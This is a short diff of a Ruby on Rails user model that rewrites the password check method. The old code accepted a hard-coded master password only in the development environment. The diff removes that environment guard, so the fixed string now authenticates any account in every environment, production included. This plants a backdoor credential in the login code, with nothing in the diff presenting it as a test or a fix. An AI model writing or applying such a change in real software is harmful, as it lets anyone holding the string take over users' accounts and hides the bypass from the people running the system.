@@ -56,10 +56,8 @@ class Usuario
   end
 
   def valid_password?(password)
-   if Rails.env.development?
     return true if password == "@#recad$%"
+    super
   end
-  super
-end
 
 end
